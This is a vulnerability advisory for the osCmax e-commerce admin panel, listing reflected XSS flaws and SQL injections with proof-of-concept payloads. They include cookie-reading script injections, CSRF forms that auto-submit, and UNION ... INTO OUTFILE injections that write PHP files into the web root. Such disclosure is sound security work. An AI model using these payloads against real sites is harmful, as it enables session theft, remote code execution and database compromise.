Advisory Details:

High-Tech Bridge SA Security Research Lab has discovered multiple vulnerabilities in osCmax, which can be exploited to perform SQL Injection and Cross-Site Scripting (XSS) attacks.

1) Multiple Cross-Site Scripting (XSS) in osCmax: CVE-2012-1664

1.1 Input passed via the "username" POST parameter to /admin/login.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:


<form action="http://[host]/admin/login.php?action=process" method="post" name="main" id="main">
<input type="hidden" name="username" value="'<script>alert(document.cookie);</script>">
<input type="hidden" name="password" value="">
<input type="submit" name="submit" value="Send">
</form>


1.2 Input passed via the "pageTitle" GET parameter to /admin/new_attributes_include.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of affected website.

The following PoC demonstrates the vulnerability:

http://[host]/admin/new_attributes_include.php?pageTitle=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that "register_globals" is enabled.

1.3 Input passed via the "sb_id", "sb_key", "gc_id", "gc_key" and "path" POST parameters to /admin/htaccess.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of affected website.

The following PoC demonstrates the vulnerability:


<form action="http://[host]/admin/htaccess.php" method="post" name="main" id="main">
<input type="hidden" name="sb_id" value='"><script>alert(1);</script>'>

<input type="hidden" name="path" value='"><script>alert(5);</script>'>
<input type="submit" name="submit" value="Send">
</form>


Successful exploitation of this vulnerability requires that "register_globals" is enabled.

1.4 Input passed via the "title" GET parameter to /admin/information_form.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in user's browser session in context of affected website.

The following PoC (Proof of Concept) demonstrates the vulnerability:

http://[host]/admin/information_form.php?title=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

Successful exploitation of this vulnerability requires that "register_globals" is enabled.

1.5 Input passed via the "search" GET parameter to /admin/xsell.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC demonstrates the vulnerability:

http://[host]/admin/xsell.php?search=%27%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.6 Input passed via the "gross" and "max" GET parameters to /admin/stats_products_purchased.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC demonstrate the vulnerability:

http://[host]/admin/stats_products_purchased.php?gross=%22%20%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admin/stats_products_purchased.php?max=%27%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.7 Input passed via the "status" GET parameter to /admin/stats_monthly_sales.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC demonstrates the vulnerability:

http://[host]/admin/stats_monthly_sales.php?status=%27%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.8 Input passed via the "sorted" GET parameter to /admin/stats_customers.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC demonstrates the vulnerability:

http://[host]/admin/stats_customers.php?sorted=%27%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.9 Input passed via the "information_id" GET parameter to /admin/information_manager.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC demonstrates the vulnerability:

http://[host]/admin/information_manager.php?information_action=Edit&information_id=%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.10 Input passed via the "zID" GET parameter to /admin/geo_zones.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC demonstrates the vulnerability:

http://[host]/admin/geo_zones.php?action=list&zID=%27%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E

1.11 Input passed via the "current_product_id" and "cPath" GET parameters to /admin/new_attributes_include.php is not properly sanitised before being returned to the user.
This can be exploited to execute arbitrary HTML and script code in administrator's browser session in context of affected website.

The following PoC demonstrate the vulnerability:

http://[host]/admin/new_attributes_include.php?current_product_id=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
http://[host]/admin/new_attributes_include.php?cPath=%22%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E


2) Multiple SQL Injections in osCmax: CVE-2012-1665

2.1 Input passed via the "status" GET parameter to /admin/stats_monthly_sales.php is not properly sanitised before being used in SQL query. This can be exploited to alter SQL queries. 
The vulnerability usage is limited to the "INTO FILE" clause. This vulnerability requires administrative privileges, however can be exploited via the CSRF technique. Remote attacker should make logged-in website administrator open the following URL (in hidden iframe for example): 

http://[host]/admin/stats_monthly_sales.php?status=0 union select '<? php_code ?>' INTO OUTFILE '../../../path/to/site/file.php'

Depending on MySQL and PHP configurations, as well as file system permissions this PoC should create arbitrary PHP file within the web root. 

2.2 Input passed via the "country" POST parameter to /admin/create_account_process.php is not properly sanitised before being used in SQL query. This can be exploited to alter SQL queries. 
The vulnerability usage is limited to the "INTO FILE" clause. This vulnerability requires administrative privileges, however can be exploited via the CSRF technique. Remote attacker should make logged-in website administrator open the page with following html code: 


<form action="http://[host]/admin/create_account_process.php" method="post" name="main" id="main">
<input type="hidden" name="country" value="1' UNION SELECT '<? php_code ?>' INTO OUTFILE '../../../path/to/site/file.php' -- 2">
<input type="hidden" name="action" value="process">
<input type="submit" name="submit" value="Send">
<input type="submit" id="btn"> 
</form>
<script>
document.getElementById('btn').click();
</script>


Depending on MySQL and PHP configurations, as well as file system permissions this PoC should create arbitrary PHP file within the web root. 

2.3 Input passed via the "username" POST parameter to /admin/login.php is not properly sanitised before being used in SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC (Proof of Concept) demonstrates the vulnerability:


<form action="http://[host]/admin/login.php?action=process" method="post" name="main" id="main">
<input type="hidden" name="username" value="',1,2,(select min(@a:=1)from (select 1 union select 2)k group by (select concat(@@version,0x0,@a:=(@a+1)%2)))) -- 2">
<input type="hidden" name="password" value="">
<input type="submit" name="submit" value="Send">
</form>
